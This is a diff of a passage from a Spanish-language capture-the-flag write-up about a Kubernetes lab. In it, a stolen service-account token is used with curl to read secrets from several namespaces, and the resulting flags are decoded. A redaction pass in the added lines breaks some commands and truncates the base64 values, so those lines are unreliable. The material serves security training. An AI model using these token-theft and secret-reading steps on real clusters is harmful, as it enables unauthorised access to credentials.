@@ -131,10 +131,10 @@ pod=$(/lib64/ld-linux-x86-64.so.2 /app/kubectl get pods -n backend -o jsonpath='
   token=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
   
   # Flag 1 (Frontend)
-  curl -k -s -H "Authorization: Bearer $token" https://$KUBERNETES_SERVICE_HOST:$KUBERNETES_SERVICE_PORT/api/v1/namespaces/frontend/secrets/flag1
+  curl -k -s -H "Authorization: Bearer $token" https://$KUBERNETES_SERVICE_HOST:$KUBERNETES_SERVICE_SECRET_REDACTED_BY_ANTIGRAVITYflag1
   
   # Flag 2 (Backend)
-  curl -k -s -H "Authorization: Bearer $token" https://$KUBERNETES_SERVICE_HOST:$KUBERNETES_SERVICE_PORT/api/v1/namespaces/backend/secrets/flag2
+  curl -k -s -H "Authorization: Bearer $token" https://$KUBERNETES_SERVICE_HOST:$KUBERNETES_SERVICE_SECRET_REDACTED_BY_ANTIGRAVITYlag2
   
   # Flag 3 (Win Namespace)
   curl -k -s -H "Authorization: Bearer $token" https://$KUBERNETES_SERVICE_HOST:$KUBERNETES_SERVICE_PORT/api/v1/namespaces/win-namespace/secrets/flag3-master-treasure
@@ -148,15 +148,15 @@ pod=$(/lib64/ld-linux-x86-64.so.2 /app/kubectl get pods -n backend -o jsonpath='
 Los comandos anteriores devolvieron JSONs con los valores en base64. Al decodificarlos:
 
 ### Flag 1: Frontend Secret
-*Base64:* `UkU6Q1RGe2luaXRpYWxfYm9vdHlfc3RvbGVuX2Zyb21fZnJvbnRlbmR9`
+*Base64:* `SECRET_REDACTED_BY_ANTIGRAVITYb21fZnJvbnRlbmR9`
 **Flag:** `RE:CTF{initial_booty_stolen_from_frontend}`
 
 ### Flag 2: Backend Secret
-*Base64:* `UkU6Q1RGe2xhdGVyYWxfbW92ZV90b19iYWNrZW5kX3N1Y2Nlc3N9`
+*Base64:* `SECRET_REDACTED_BY_ANTIGRAVITYX3N1Y2Nlc3N9`
 **Flag:** `RE:CTF{lateral_move_to_backend_success}`
 
 ### Flag 3: Win Namespace Secret
-*Base64:* `UkU6Q1RGe2VudGlyZV9mbGVldF9jb25xdWVyZWRfYWxtb3N0X2NsdXN0ZXJfYWRtaW59`
+*Base64:* `SECRET_REDACTED_BY_ANTIGRAVITYYWxtb3N0X2NsdXN0ZXJfYWRtaW59`
 **Flag:** `RE:CTF{entire_fleet_conquered_almost_cluster_admin}`
 
 ---
